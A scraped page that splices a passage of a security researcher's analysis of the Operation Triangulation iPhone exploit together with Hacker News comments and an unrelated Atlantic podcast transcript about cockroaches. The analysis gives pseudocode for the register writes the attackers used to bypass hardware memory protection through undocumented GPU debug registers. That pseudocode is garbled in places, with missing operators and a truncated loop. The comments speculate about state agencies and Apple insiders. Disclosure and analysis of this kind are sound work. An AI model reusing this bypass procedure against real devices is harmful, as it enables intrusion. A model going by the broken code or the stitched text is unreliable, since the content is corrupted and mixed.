17 18 19 20 21 22 23 def ml_dbgwrap_halt_cpu(): value = read_qword(0x206040000) if ((value & 0x90000000) != 0): return write_qword(0x206040000, value0x80000000) while (True): if ((read_qword(0x206040000) & 0x10000000) != 0): break def ml_dbgwrap_unhalt_cpu(): value = read_qword(0x206040000) value = (value & 0xFFFFFFFF2FFFFFFF)0x40000000 write_qword(0x206040000, value) while (True): if ((read_qword(0x206040000) & 0x10000000) == 0): break Pseudocode for the usage of the, 0x206040000 register by the exploit I was able to match the ml_dbgwrap_halt_cpu function from the pseudocode above to a function with the same name in the dbgwrap.c file of the XNU source code. This file contains code for working with the ARM CoreSight MMIO debug registers of the main CPU. The source code states that there are four CoreSight-related MMIO regions, named ED, CTI, PMU, and UTT. Each occupies 0x10000 bytes, and they are all located next to one another. The ml_dbgwrap_halt_cpu function uses the UTT region, and the source code states that, unlike the other three, it does not come from ARM, but is a proprietary Apple feature that was added just for convenience. I was able to confirm that 0x206000000–0x206050000 was indeed a block of CoreSight MMIO debug registers for the GPU coprocessor by writing ARM_DBG_LOCK_ACCESS_KEY to the corresponding location. Each core of the main CPU has its own block of CoreSight MMIO debug registers, but unlike the GPU coprocessor, their addresses can be found in the device tree. It is also interesting that the author(s) of this exploit knew how to use the proprietary Apple UTT region to unhalt the CPU: this code is not part of the XNU source code. Perhaps it is fair to say that this could easily be found out through experimentation. Something that cannot be found that way is what the attackers did with the registers in the second unknown region. I am not sure what blocks of MMIO debug registers are located there, or how the attackers found out how to use them if they were not used by the firmware. Let us look at the remaining unknown registers used by the exploit. The registers 0x206140008 and 0x206140108 control enabling/disabling and running the hardware feature used by the exploit. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 def dma_ctrl_1(): ctrl = 0x206140108 value = read_qword(ctrl) write_qword(ctrl, value0x8000000000000001) sleep(1) while ((~read_qword(ctrl) & 0x8000000000000001) != 0): sleep(1) def dma_ctrl_2(flag): ctrl = 0x206140008 value = read_qword(ctrl) if (flag): if ((value & 0x1000000000000000) == 0): value = value0x1000000000000000 write_qword(ctrl, value) else: if ((value & 0x1000000000000000) != 0): value = value & ~0x1000000000000000 write_qword(ctrl, value) def dma_ctrl_3(value): ctrl = 0x206140108 value = value0x8000000000000000 write_qword(ctrl, read_qword(ctrl) & value) while ((read_qword(ctrl) & 0x8000000000000001) != 0): sleep(1) def dma_init(original_value_0x206140108): dma_ctrl_1() dma_ctrl_2(False) dma_ctrl_3(original_value_0x206140108) def dma_done(original_value_0x206140108): dma_ctrl_1() dma_ctrl_2(True) dma_ctrl_3(original_value_0x206140108) Pseudocode for the usage of the 0x206140008 and 0x206140108 registers by the exploit The register 0x206150020 is used only for Apple A15/A16 Bionic SoCs. It is set to 1 during the initialization stage of the exploit, and to its original value, during the finalization stage. The register 0x206150040 is used to store some flags and the lower half of the destination physical address. The last register, 0x206150048, is used for storing the data that needs to be written and the upper half of the destination physical address, bundled together with the data hash and another value (possibly a command). This hardware feature writes the data in aligned blocks of 0x40 bytes, and everything should be written to the 0x206150048 register in nine sequential writes. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 if (cpuid == 0x8765EDEA): # CPUFAMILY_ARM_EVEREST_SAWTOOTH (A16) i = 8 mask = 0x7FFFFFF elif (cpuid == 0xDA33D83D): # CPUFAMILY_ARM_AVALANCHE_BLIZZARD (A15) i = 8 mask = 0x3FFFFF elif (cpuid == 0x1B588BB3): # CPUFAMILY_ARM_FIRESTORM_ICESTORM (A14) i = 0x28 mask = 0x3FFFFF elif (cpuid == 0x462504D2): # CPUFAMILY_ARM_LIGHTNING_THUNDER (A13) i = 0x28 mask = 0x3FFFFF elif (cpuid == 0x07D34B9F): # CPUFAMILY_ARM_VORTEX_TEMPEST (A12) i = 0x28 mask = 0x3FFFFF dma_init(original_value_0x206140108) hash1 = calculate_hash(data) hash2 = calculate_hash(data+0x20) write_qword(0x206150040, 0x2000000(phys_addr & 0x3FC0)) pos = 0 while (pos > 14) & mask) > j) & 1) != 0): acc ^= sbox[32 * i + j] return acc Pseudocode for the hash function used by this unknown hardware feature As you can see, it is a custom algorithm, and the hash is calculated by using a predefined sbox table. I tried to search for it in a large collection of binaries, but found nothing. You may notice that this hash does not look very secure, as it occupies just 20 bits (10+10, as it is calculated twice), but it does its job as long as no one knows how to calculate and use it. It is best summarized with the term “security by obscurity“. How could attackers discover and exploit this hardware feature if it is not used and there are no instructions anywhere in the firmware on how to use it? I ran one more test. I checked and found that the M1 chip inside the Mac also has this unknown hardware feature. Then I used the amazing m1n1 tool to conduct an experiment. This tool has a trace_range function, which traces all access to a provided range of MMIO registers. I used it to set up tracing for the memory range 0x206110000–0x206400000, but it reported no usage of these registers by macOS. Through an amazing coincidence, both my 37C3 presentation and this post discuss a vulnerability very similar to the one I talked about during my presentation at the 36th Chaos Communication Congress (36C3) in 2019. In the presentation titled, “Hacking Sony PlayStation Blu-ray Drives”, I talked about how I was able to dump firmware and achieve code execution on the Blu-ray drives of Sony PlayStation 3 and 4 by using MMIO DMA registers that were accessible through SCSI commands. I was able to discover and exploit this vulnerability, because earlier versions of the firmware used these registers for all DRAM operations, but then Sony stopped using them and started just accessing DRAM directly, because all DRAM was also mapped to the CPU address space. Because no one was using these registers anymore and I knew how to use them, I took advantage of them. It did not need to know any secret hash algorithm. Could something similar have happened in this case? I do not know that, but this GPU coprocessor first appeared in the recent Apple SoCs. In my personal opinion, based on all the information that I provided above, I highly doubt that this hardware feature was previously used for anything in retail firmware. Nevertheless, there is a possibility that it was previously revealed by mistake in some particular firmware or XNU source code release and then removed. I was hoping to find out what was located inside the second unknown region from the fix for this vulnerability implemented in iOS 16.6. I was able to find out how Apple mitigated this issue, but they obfuscated the fix. Apple mitigated this vulnerability by adding the MMIO ranges 0x206000000–0x206050000 and 0x206110000–0x206400000 used by the exploit to the pmap-io-ranges stored in the device tree. XNU uses the information stored there to determine whether to allow mapping of certain physical addresses. All entries stored there have a meaningful tag name that explains what kind of memory the range belongs to. Example of entries stored in the pmap-io-ranges Here, PCIe stands for “Peripheral Component Interconnect Express”, DART stands for “Device Address Resolution Table”, DAPF means “Device Address Filter”, and so on. And here are the tag names for regions used by the exploit. They stand out from the rest. Entries for regions used by the exploit Conclusion This is no ordinary vulnerability, and we have many unanswered questions. We do not know how the attackers learned to use this unknown hardware feature or what its original purpose was. Neither do we know if it was developed by Apple or it’s a third-party component like ARM CoreSight. What we do know—and what this vulnerability demonstrates—is that advanced hardware-based protections are useless in the face of a sophisticated attacker as long as there are hardware features that can bypass those protections. Hardware security very often relies on “security through obscurity”, and it is much more difficult to reverse-engineer than software, but this is a flawed approach, because sooner or later, all secrets are revealed. Systems that rely on “security through obscurity” can never be truly secure.

The MMIO abuse implies either the attackers have truly phenomenal research capabilities, and&#x2F;or that they hacked Apple and obtained internal hardware documentation (more likely).I was willing to believe that maybe it was just a massive NSA-scale research team up until the part with a custom hash function sbox. Apple appears to have known that the feature in question was dangerous and deliberately both hidden it, whatever it is, and then gone further and protected it with a sort of (fairly weak) digital signing feature.As the blog post points out, there&#x27;s no obvious way you could find the right magic knock to operate this feature short of doing a full silicon teardown and reverse engineering (impractical at these nodes). That leaves hacking the developers to steal their internal documentation.The way it uses a long chain of high effort zero days only to launch an invisible Safari that then starts from scratch, loading a web page that uses a completely different chain of exploits to re-hack the device, also is indicative of a massive organization with truly abysmal levels of internal siloing.Given that the researchers in question are Russians at Kaspersky, this pretty much has to be the work of the NSA or maybe GCHQ.Edit: misc other interesting bits from the talk: the malware can enable ad tracking, and also can detect cloud iPhone service hosting that&#x27;s often used by security researchers. The iOS&#x2F;macOS malware platform seems to have been in development for over a decade and actually does ML on the device to do object recognition and OCR on photos on-device, to avoid uploading image bytes: they only upload ML generated labels. They truly went to a lot of effort, but all that was no match for a bunch of smart Russian students.I&#x27;m not sure I agree with the speaker that security through obscurity doesn&#x27;t work, however. This platform has been in the wild for ten years and nobody knows how long they&#x27;ve been exploiting this hidden hardware \"feature\". If the hardware feature was openly documented it&#x27;d have been found much, much sooner. reply black_puppydog 11 hours agoparent> If the hardware feature was openly documented it&#x27;d have been found much, much sooner.Well, the point of kerckhoff&#x27;s principle is that it should have been openly documented and then anyone lookindg at the docs even pre-publication would have said \"we can&#x27;t ship it like that, that feature needs to go.\" reply eastof 2 hours agoparentprevMaybe more likely they just have people inside Apple? reply aberoham 12 hours agoparentprevAlso note the IoC script — This script allows to scan iTunes backups for indicator of compromise by Operation Triangulation. https:&#x2F;&#x2F;github.com&#x2F;KasperskyLab&#x2F;triangle_check reply sampa 15 hours agoparentprevor Apple just implemented this \"API\" for them, because they&#x27;ve asked nicely reply chatmasta 15 hours agorootparentOr they have assets working at Apple... or they hired an ex-Apple employee... etc.That&#x27;s the problem with this sort of security through obscurity; it&#x27;s only secure as long as the people who know about it can keep it secret. reply mike_hearn 14 hours agorootparentI don&#x27;t think hiring an ex-Apple dev would let you get the needed sbox unless they stole technical documentation as they left.So it either has to be stolen technical docs, or a feature that was put there specifically for their usage. The fact that the ranges didn&#x27;t appear in the DeviceTree is indeed a bit suspicious, the fact that the description after being added is just &#x27;DENY&#x27; is also suspicious. Why is it OK to describe every range except that one?But the really suspicious thing is the hash. What kind of hardware interface does arbitrary DMA protected by a secret but weak hash function? Is there any legitimate usage for such a thing? I&#x27;ve never heard of such an interface before.If it&#x27;s a genuine backdoor and not a weird debugging feature then it should be rather difficult to add one that looks like this without other people in Apple realizing it&#x27;s there. Chips are written in source code using version control, just like software. You&#x27;d have to have a way to modify the source without anyone noticing or sounding the alarm, or modifying it before synthesis is performed. That&#x27;d imply either a very deep penetration of Apple&#x27;s internal network sufficient to inject backdoors into hardware, or they have one or more agents.This really shows how dangerous it is to intel agencies when they decide to attack security professionals.

Presumably, they were after emails describing more zero days in other programs. reply mrandish 7 hours agorootparent> What kind of hardware interface does arbitrary DMA protected by a secret but weak hash function?I agree. This appears to likely be an intentional backdoor injected at the hardware level during design. At such a low-level I think it could have been accomplished with only a handful of employees in on it. There would have been no need to subvert Apple from the top down with large numbers of people at many levels being privy.In early silicon there can be a bunch of registers and functions implemented for testing which are later pulled out. Except maybe one set of registers doesn&#x27;t get pulled but instead a door knock is added with a weak hash function, making the registers invisible to testers and fuzzing.It seems a little too convenient that the door knock hash was weak. After all, strong hash functions aren&#x27;t unknown or hard. The reason it had to be a weak hash function was to create \"plausible deniability\". If it was a strong hash then once any exploitation was discovered there would be no denying the vuln was intentionally placed. If it really was just a test DMA function that someone supposedly &#x27;forgot&#x27; to remove before production silicon, I can&#x27;t think of a reason to have it behind any kind of door knock in the first place.I read that it was patched by adding these addresses to the \"access denied\" list. While I don&#x27;t know anything about Apple security, I&#x27;m stunned that any such low-level access list isn&#x27;t &#x27;opt-in&#x27; instead of &#x27;opt-out&#x27;. If it was &#x27;opt-in&#x27; it seems like any such &#x27;undocumented&#x27; register addresses would by denied by default. And if they were on the &#x27;opt-in&#x27; list, yet remained undocumented, then it would be obvious to anyone looking at the security docs that something was amiss. reply justinclift 28 minutes agorootparentprev> I don&#x27;t think hiring an ex-Apple dev would let you get the needed sboxThat&#x27;d probably depend on which team the dev worked in.

I knew about it for the main CPUs, makes perfect sense it&#x27;d exist for the ASCs too. Someone had a lightbulb moment.

I bet this is a cache RAM debug register, and it&#x27;s writing directly to the raw cache memory array, including the ECC bits, so it has to manually calculate them (yes, caches in Apple SoCs have ECC, I know at least AMCC does and there&#x27;s no reason to think GPU&#x2F;ASC caches wouldn&#x27;t too). The \"sbox\" is just the order of the input bits to the ECC generator, and the algorithm is a textbook ECC code.

They&#x27;re physically close to documented GPU registers, and accessing them triggers a GPU panic, which is how the researchers attributed them to the GPU component. The attackers could have used that same test to identify the existence of the registers.The part that&#x27;s less easily explained is how they were able to reconstruct a custom sbox table to execute the debug code. That&#x27;s where the \"insider threat\" insinuations are strongest, but personally I&#x27;m not convinced that it precludes any number of other plausible explanations. For example, the attackers could have extracted the sbox from: older firmwares, OTA update patches, pre-release development devices (probably purchasable on ebay at some points), iOS beta releases, or a bunch of other leaky vectors.The researcher basically says \"I couldn&#x27;t find this sbox table in any other binary where I looked for it.\" Well, that&#x27;s not necessarily surprising since it appears to be Apple specific and thus there are a limited number of binaries where it might have appeared. And as the researcher notes, this includes now unpublished binaries that might have been mistakenly released. It&#x27;s totally plausible that the attackers got lucky at some point while they were systematically sniffing for this sort of leak, and that the researcher is unlikely to have the same luck any time soon. reply londons_explore 12 hours agoparentprevLooking at that sbox implementation, I can&#x27;t believe it was implemented as a lookup table in the hardware of the chip - there must be some condensed Boolean expression that gives the same result.The fact the attackers didn&#x27;t know that Boolean expression suggests they reverse engineered it rather than had documentation. reply transpute 14 hours agopreviMessage can be disabled by local MDM for supervised devices, via free Apple Configurator in macOS app store, https:&#x2F;&#x2F;support.apple.com&#x2F;guide&#x2F;deployment&#x2F;restrictions-for-...

From the article, if you look at the bullet points under the Kaspersky diagram of the exploit chain:> After exploiting all the vulnerabilities, the JavaScript exploit can do whatever it wants to the device and run spyware, but attackers chose to: a) launch the imagent process and inject a payload that cleans the exploitation artifacts from the device; b) run the Safari process in invisible mode and forward it to the web page with the next stage.In other words, if looking at the diagram, https:&#x2F;&#x2F;cdn.arstechnica.net&#x2F;wp-content&#x2F;uploads&#x2F;2023&#x2F;12&#x2F;trian... , it&#x27;s completely \"game over\" once you get to the skull icon in the lower left corner, and the Safari exploit is after that. reply dunham 11 hours agorootparentprevYeah, lockdown mode might have handled it.

Apple has amazing security, especially for the Iphone and continously monitors it and dishes out silent patches. For a REALLY high level example, it restricts system calls per process and requires all calls to be signed with an apple key, AND it restricts who you can do the system call to, these are continuously monitored and updated. Not only this, but persistence on Iphone is effectively dead, meaning you have to reinfect the device after every reboot.

This ignores the fact that attacks at the 2-3 million dollar range are trivially wormable. If you had actual cause to hack every phone you are only incurring marginal cents per attack.

You do need to be fairly tech-savvy and remember that it&#x27;s enabled, because sometimes something silently breaks and you need to opt-out of it (which you can do for a specific website, or WebViews within a specific app). And it won&#x27;t auto-join \"insecure\" WiFi which can be annoying at a hotel, but frankly it&#x27;s probably for the best. Also you won&#x27;t receive texts with attachments in them, which is usually desirable but breaks workflows like activating a new SIM card while traveling (it&#x27;s possible this was broken for me due to some other setting to exclude texts from unknown numbers).The most noticeable difference is that SVG elements (?) are replaced with emojis.

Not only is it extremely unlikely that it could be kept a secret, but Apple&#x27;s thing is \"obsessive control\", a mindset borne of organizational PTSD which originated with its near-death experience in the mid-to-late 90s. The Apple I know would not risk intentionally leaving back doors unlocked for enemies to find and leverage.As for (2), the existence of a \"Binder of Vulns\" by nation-states would expose Apple to existential risk. It&#x27;s possible that it could be kept secret within Apple&#x27;s walls if it were never used, but once shared with a government it could not be contained. The splash damage of such a discovery could easily kill Apple. reply kornhole 14 hours agorootparentI am assuming or knowing that the national security apparatus can both coerce and incentivize companies and individuals to give it what it wants. Their power is great and relatively unchecked to do both. Coercion tactics include releasing compromising information on a company, person or family member and more directly injuring person or company. Incentives include favorable regulation, taxation, and deals with other companies they control.Knowledge of a binder of vulnerabilities is perhaps one of the greatest secrets that must be protected. Wikileaks releasing the Vault 7 leak was the death knell of Julian Assange. It proved such a binder exists in great detail.I don&#x27;t hate Apple, but assuming they can&#x27;t be reached, seems naïve. reply realusername 14 hours agorootparentprevWe already know Apple has participated to the PRISM program, it&#x27;s not speculation anymore. reply StayTrue 14 hours agorootparentprevThis happened at a company I worked at so it’s not out of the question.

Incredible sophisticated and just goes to show you that it basically can’t be defended against reply whartung 15 hours agoparentIt can be defended against. The detail is that the only way to harden those defenses is to toss it out in the world and let folks poke holes in it.This was an extremely complex exploit. It was complex because of all of the defenses put in place by Apple and others. It required State level resources to pull it off.We also don&#x27;t know what, if any, external skullduggery was involved in the exploit. Did someone penetrate Apple&#x2F;ARM and get internal documentation? Compromise an employee? Did Apple&#x2F;ARM participate? Maybe they just dissolved a CPU cover, and reverse engineered it.But, that cat is not out of the bag, and it&#x27;s been patched.Progress.As many folks say, when it comes to dealing with security, consider the threat model. Being under the lens of an advanced State is different from keeping your young brother out of your WoW account.This exploit wasn&#x27;t done by a bunch of scammers selling \"PC Support\". That&#x27;s the good news.When stuff like this happens, I always go back to Stuxnet, where not only did they breach an air gap, they went in and did a sneak and peek into some other company to get the private signing keys so that their corrupted payload was trusted.

They are likely used for debugging and&#x2F;or testing.A lot of those registers can do very interesting things, since e.g. fault-injection is an important part of testing. A security-minded implementation will allow these to either be fused off or disabled very early in the boot process. The latter is probably more common, and any disconnect between the hardware and software side can cause this step to get missed. reply hnburnsy 10 hours agorootparentVery interesting, thanks dor the insight.

Because this feature is not used by the firmware, we have no idea how attackers would know how to use it.However, keep in mind that this level of \"bugdooring\" is possible without Apple&#x27;s explicit cooperation. In fact, the attackers don&#x27;t even need to force a bug into the code. It would probably be sufficient to have someone on staff who is familiar with the Apple hardware development process (and therefore knows about the availability of these tools), or to simply get a copy of the firmware&#x27;s source code. Sophisticated attackers likely have moles embedded within Apple. But they don&#x27;t even need that here; they could just hire an ex-Apple employee and get all the intel they need. reply sampa 14 hours agorootparentwell of course nobody would have NSA_friendly_override() in the sourceplausible deniability is essential in such cases, hence the term bugdoor reply halJordan 14 hours agorootparentThis is the same conspiracy mindset of flat earthers, and you deserve your own netflix mockumentary over it.Because a bug is a bug, it&#x27;s very nature means you cannot prove it isn&#x27;t malicious, therefore you take it as positive proof of malice and sit pretty bc no one can prove a negative. reply Aerbil313 11 hours agorootparentWe had backdoors, then PRISM revealed.

The speaker&#x27;s notes in the briefing document reviewed by The Washington Post indicated that &#x27;98 percent of PRISM production is based on Yahoo, Google, and Microsoft&#x27;\"With the rise of end-to-end encryption in the wake of the Snowden revelations, this put large tech corporations in a bind, given the conflict between consumer desire for secure snoop-proof devices, and government desire for backdoor access. Pressure might have been applies by government contracting decisions, so no cooperation == no big government contract. The general rise of end-to-end encryption also meant that things like deep packet inspection along the trunk no longer worked, putting a premium on breaking into devices to install keyloggers etc.All the fear of China doing this with Huawei (probably well-justified fear) may have risen in part as projection by politicians and insiders who knew the US government was doing it already with Apple, Android, Intel, ARM, etc. The US government has certainly retained legalistic justification for such behavior, even though the Act expired in 2020[1].

    "originBody": "Radio Atlantic How We Turned the Tide in the Roach Wars Forty years ago, scientists did the impossible. Why doesn’t anyone remember? By Daniel Engber A still from \"Joe's Apartment\" (1996) (Warner Bros / Everett) November 30, 2023 Share Saved StoriesSave A week before Christmas in 1983, two chemists at Yale University made a breakthrough that they thought could change the world. “It was like opening up a door and seeing a light,” one of the scientists, Stuart Schreiber, later told The New York Times. The pair had produced a substance, periplanone-B, that sends the male American cockroach into a thrashing, sexual frenzy. What if this were used to build a better trap—a cockroach honeypot that lured bugs into a dish of poison? The implications were mind-bending. Cockroaches were overrunning U.S. cities in the 1980s—more than 2 billion lived in New York alone, according to the Times—and there was no good way of getting rid of them. Sprayed insecticides barely worked after decades’ worth of insect evolution. “Roach Motels” (glue traps, more or less) did next to nothing to prevent an infestation. My own family, like others living in apartments throughout New York City at the time, could only shrug at the roaches darting from our cupboards and crawling on the bathroom floor. I remember that my best friend’s parents had a gecko living underneath their fridge, supposedly for natural bug control. No doubt it was a fat and healthy lizard. The roaches were still legion. So of course scientists producing a new roach attractant in a lab made the papers. Alas, the periplanone-B solution was just another failed idea—one of many bungled forays in a never-ending war. The bugs kept on marching through our homes, as they always had; they kept on laying all their hidden eggs. Yet again, the cockroach earned its reputation as the animal that could never, ever be wiped out. But even as this disappointment faded, something unbelievable was just about to happen. A true miracle in roach control was already under way. In this episode of Radio Atlantic, I speak with Hanna Rosin about a neglected achievement in the history of pest control. Listen to the conversation here: Subscribe here: Apple PodcastsSpotifyYouTubeGoogle PodcastsPocket Casts The following is a transcript of the episode: Hanna Rosin: This is Radio Atlantic. I’m Hanna Rosin. A few weeks ago, one of our science editors, Dan Engber, said he had a story to tell me. It’s a little weird, definitely gross. But it’s amazing. Here it is. [Break] Rosin: Well, first close the door behind you. Hey. Daniel Engber: Hello. Rosin: What’s up? Engber: So I have a story about a scientific discovery made in very recent times that no one thought was possible, which changed the lives of millions. Rosin: Ooh. Engber: But no one remembers it. Rosin: Wow. That sounds … fake? (Laughs.) Do you want to tell me what it is? Engber: Sure. So this is a story of a forgotten solution, but also of a forgotten problem, and that problem is cockroaches. Rosin: Cockroach—what do you mean cockroaches are a forgotten problem? I feel like I saw one recently. Engber: Right. You saw one—one cockroach. In the 1980s, there were a lot of cockroaches everywhere. Cockroaches were like a national news story and almost like a public-health emergency. So there would be articles with various levels of alarmism about how the risk of being hospitalized with childhood asthma was three times higher in kids who were exposed to cockroach infestations. There were stories about how cockroaches could carry the polio and yellow fever viruses. Rosin: Okay. So cockroaches everywhere. Cockroaches bad for your health. Engber: Cockroaches everywhere. Cockroaches bad for your health. Cockroaches in the nation’s Capitol. [News reel] Tom Brokaw: Congress certainly has its hands full these days with the deficit, the MX, Central America, and now debugging. Engber: So this is an NBC Nightly News story with Tom Brokaw from the spring of 1985, which is a very important moment in the history of cockroaches. [News reel] Interviewee: It’s very serious. The problem: They’re in our desks. They’re under tables. They’re everywhere. Journalist: Some members of Congress are trying valiantly to fight back. Congressman Al McCandless has installed this black box in his office. It exudes a sexy scent, which attracts female roaches, which are then roasted by an electric grill. Engber: I mean, I think just in that short clip you hear how completely helpless we were to deal with the cockroach problem. We were trying everything. Rosin: Yes, it does have a “throw spaghetti at the wall” [feel]. Like, this is the nation’s Capitol and we can’t—we don’t really have an answer, nor is anyone pretending to. It’s just like, They tried this. They tried that. [News reel] Journalist: Congressman Silvio Conte, dressed to kill today, proclaimed a war on Capitol cockroaches. A company from his home district has donated 35,000 roach traps to the Capitol. But Conte said more help than that is needed. Silvio Conte: And I want to appeal to the president of the United States. I am certain that President Reagan wants to get rid of as many troublesome cockroaches who are running around the halls of Congress as possible. So please join me in this war and squash one for the Gipper! [Music] Engber: But, you know, listening to all this kind of has an almost, like, a dreamy quality for me because I actually lived through this myself. Like, I was a child of the cockroach ’80s. I had cockroaches in my house all over the place too, and it’s almost, like, hard to remember how pervasive they were. [Music] Engber: So I grew up in New York City. Rosin: Where? Engber: In Morningside Heights. Rosin: In an apartment? Engber: In an apartment. Rosin: Okay. Engber: So, middle-class families in the 1980s in New York City had a lot of cockroaches, as I can say from personal experience—just a number of cockroaches that I think is unimaginable to younger people, to my younger colleagues here at The Atlantic. Rosin: Against my—really, like, every fiber of my being, I’m going to say, “Paint me a picture.” (Laughs.) Engber: They’d be all over the place all the time, like, in full view, in day, in night. Um, certainly if you went into the kitchen at night and turned on the light, they would scatter. It wouldn’t be like you’d see individual insects; you’d see, like, a wave pattern. You and your brother, let’s say, might be taking the Cheerios out of the cabinet. And open it up, and pour it into the bowl, and cockroaches would come out with the Cheerios, which I think sounds really terrifying to today’s New Yorker. But at the time it was just, like, Time to get a new box of Cheerios. There’s really this feeling that it was, like, a natural phenomenon—like an endless sense of being enveloped in roaches. Like, it was an atmosphere of roaches or an ocean. You’re speechless. Rosin: Just to weigh in, I do 100 percent relate. I grew up in an apartment in Queens, and exactly your memory. The only difference is that it was cornflakes and not Cheerios, but they were everywhere. Although, you know what’s weird? I can’t seem to remember if they freaked me out or not. Like, did they freak you out? Did you scream when you saw cockroaches or call for your mommy? What did you do? Engber: So, I don’t think we were that squeamish about them. In fact, I know we weren’t squeamish, because the other thing I remember vividly was my brother and I would play with the cockroaches. We would use our wooden blocks and build, like, obstacle courses, sort of, and try to do cockroach Olympics. Rosin: Did you actually touch them with your fingers? Engber: I mean, it’s kind of hard to imagine that I didn’t, but it must be the case. I mean, like I said, there’s sort of a dreamy quality to all this, where I almost doubt my own memories. And so just to do a kind of a gut check, I wanted to call my brother. Ben Engber: Okay. Daniel Engber: First of all, did we have cockroaches in our apartment growing up? Ben Engber: We had a lot of cockroaches in our apartment growing up, and I, being a little bit older than you, remember it extremely clearly. But it still seems somewhat fantastical, the prevalence of cockroaches in our life. Engber: Okay, so first I asked him about the cereal. Rosin: Okay. Ben Engber: I loved Rice Krispies. And they used to have, like, a slightly over-toasted Rice Krispie that was, like, a darker brown. Daniel Engber: Yeah, the occasional brown one. Ben Engber: The brown one. And I definitely remember a lot of arguments about whether something was an over-toasted Rice Krispie—a small over-toasted Rice Krispie—or a roach doody. And we would frequently have these arguments. Rosin: (Laughs.) He’s, like, completely chill about the roach-doody-for-breakfast situation. Engber: If only it was just the Rice Krispies, Hanna. Ben Engber: We had the special medicine cups. They were sort of, like, plastic, hollow spoons. Daniel Engber: Mm-hmm. Ben Engber: And I remember one time, Mom poured whatever it was, probably Dimetapp or something like that, in and I saw something swimming in it. Daniel Engber: Ooh. Ben Engber: I was like, There’s a roach in there. I swear there’s a roach in there. And then she held it up to the light, and there was nothing in there. I didn’t want to take it. Finally she convinced me. I drank the whole thing. I felt the roach crawling around all over my mouth. Rosin: Oh, God! Ben Engber: And I spit it all into the sink. And, uh, she said, Oh, there was a roach in it. Roaches were just everywhere in our lives. So if we were constantly, like, throwing out something just cause a few roaches walked over it, we wouldn’t have anything. Engber: So that’s how we lived, but here’s the important part from that conversation with Ben. Daniel Engber: Do you remember if that was in apartment 44? I forget when we moved from apartment 44 to apartment 43. Ben Engber: That was after. No, that was after it was solved, because we moved when I was 12 or 13, and it was, it was done by then. Daniel Engber: Um, when you said that by that time the cockroach problem was solved, what’s your, what’s your memory of the solving of the problem in our home? Ben Engber: Very simple: uh, Combat. Engber: So, remember when I told you that the problem we forgot was roaches? This is the solution we forgot: Combat. Rosin: Wait, you mean the Combat roach trap? Like, that little plastic disc where the roaches go in and then they die or something? Like, that’s what this is about? Engber: Yes. That is the amazing American invention that we have all forgotten. Rosin: The thing that sits in aisle 13 on the top shelf, that’s the amazing invention? Engber: The thing that should be sitting in a museum. Rosin: (Laughs.) Engber: The people who invented Combat are American heroes. They did something—I mean, you have to think about the fact that the cockroach was and is a symbol of indestructibility, right? This is the animal that’s going to outlive us after a nuclear war. Rosin: Uh-huh. Engber: This is an—if you’ve ever seen WALL-E, it’s a postapocalyptic Earth. All that’s left is a robot and a cockroach. Rosin: Uh-huh. Engber: It’s the animal that cannot be killed. And then in the 1980s, we did it. I think it’s fair to say that it solved the problem, and I don’t mean solved it completely and eliminated cockroaches forever, but really took a huge problem and made it much smaller. And that wasn’t just true in my apartment, but across the country. In fact, I found evidence that that is exactly what happened. And so, I just was fascinated by the question of, Who did that?, and what it means that we don’t even really fully remember that it happened. Rosin: Wait. There’s a who? Like, there’s a person who did that? Engber: Yeah. Let me introduce you to a very important figure in the history of cockroaches. Rosin: Mm-hmm. Engber: Who has a catchphrase, and his catchphrase is “Always bet on the roach.” He’s, um, a member of the pest-management hall of fame. Are you familiar with Pi Chi Omega, the fraternal organization dedicated to furthering the science of pest control? Rosin: Uh-huh. Engber: They have an annual scholarship called the Dr. Austin Frishman Scholarship. Rosin: Ah. Wait, are we gonna hear from Austin Frishman himself? Engber: Dr. Cockroach. Rosin: Wow. Okay. Austin Frishman: Hello? Daniel Engber: Hi. Dr. Frishman? Frishman: Speaking. Engber: And so, I got him on the line, and he turns out to be sort of, like, a cockroach mystic almost. Rosin: What is that? Engber: Just, any question you ask, you might get an answer like this. Frishman: I want you to picture a landfill, and it’s snowing. It’s about 28 degrees out, okay? And you’re there with seven or eight men, and you’re digging away at the snow because you’re teaching them how to bait on a landfill. Alright? Daniel Engber: Mm-hmm. Frishman: And then out of the snow in that cold comes American roaches running up, bubbling up—five, 10, 15, 60, 100, 200 from the smoldering heat down below. Rosin: I love this man. He makes it seem, like, biblical. So where does this cockroach mystic, Dr. Frishman, fit into this story? Engber: You know, Frishman is in the story almost from the very start. In 1985, and in the lead up to 1985, Frishman had been hired by a company called American Cyanamid. And American Cyanamid researchers had this product that they were selling for use in controlling fire ants. Rosin: Mm-hmm. Engber: And the researchers in their, you know, industrial-products division were aware of the fact that this fire ant poison worked on cockroaches. And, in fact, they used it in the lab to control cockroaches. Rosin: Their own cockroach problem? Engber: Yes. Yeah, they put it in peanut butter, and they put it around the lab, just so they could continue to do their work on fire ants. Rosin: Mm-hmm. Engber: Um, but then the company was, you know, making this effort to try to figure out, Well, can we repurpose some of our industrial products for a consumer use? And so forth. So, you’ve got a hot, new roach-control product. Who do you call? Rosin: Oh! Engber: Austin Frishman. Rosin: Yes. Austin Frishman. Frishman: And I said, “Well, it’s going to be difficult, and it may not work.” And they said to me, “Listen. Do you want to do the project or not?” I said, “No. I’ll do it just so you know what we’re up against.” Engber: Okay, so everything we had up until that point were these, you know, these insecticides that we’d just been using for years. And the roaches had just developed resistance to them. Even if you, you know, you killed 99 percent of them, the ones you didn’t kill would have some mutation that protected them or they’d have a thicker shell or something, a thicker exoskeleton, and they’d survive and reproduce. And now your insecticides weren’t working anymore. Rosin: Right. So they would just keep outsmarting us? Engber: Right. And so one of the things about this new product that made it different from the old ones was it wasn’t just a spray that you’d put in the corners. It’s actually a bait. That little, black disc had something in it that sort of tasted like oatmeal cookie that roaches loved, and they would come in and get it and then take it out. Philip Koehler: We were filming the cockroaches, and we found that only 25 percent of the cockroaches ate the bait, but 100 percent of the cockroaches would die. Engber: That’s Philip Koehler. He’s another cockroach expert. And what he’s talking about here is the fact that, like, this stuff would kill roaches that hadn’t even eaten it. Rosin: Like, what do you mean? How? Engber: Well, that’s what I asked Phil Koehler. Koehler: It was a slow-acting toxicant that allowed transfer to other members of the colony. Engber: Wait. They would regurgitate it? Or how does it get transferred? Koehler: Well, there are several mechanisms of transfer. The main one would be that cockroaches will eat another cockroach’s poop. It was actually after this work with 